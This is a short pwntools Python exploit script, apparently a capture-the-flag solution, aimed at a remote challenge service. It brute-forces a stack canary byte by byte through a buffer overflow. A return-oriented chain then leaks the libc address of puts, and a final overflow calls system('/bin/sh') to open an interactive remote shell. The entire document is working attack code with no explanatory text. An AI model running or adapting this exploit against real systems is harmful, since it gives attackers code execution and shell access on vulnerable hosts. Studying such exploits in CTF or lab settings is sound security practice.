#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or './chall')
libc = ELF(exe.libc.path)

io = remote('chall.v1t.site', 30130)

canary = b'\x00'
for i in range(3):
    for j in range(256):
        if j == 0x0a:
            continue

        io.sendlineafter(b": ", b"a"*72 + canary + bytes([j]))
        io.recvline()
        if b'*** stack smashing detected ***' in io.recvline():
            pass
        else:
            canary += bytes([j])
            break

io.sendlineafter(b": ", b"A"*72 + canary + b"A"*12 + p32(0x0804901e) + p32(exe.got.puts+0x1fd8) + p32(0x08049280))

io.recvline()
libc.address = u32(io.recv(4)) - libc.sym.puts

io.sendlineafter(b": ", b"A"*72 + canary + b"A"*12 + p32(libc.sym.system) + p32(0x41414141) + p32(next(libc.search(b'/bin/sh'))))

io.interactive()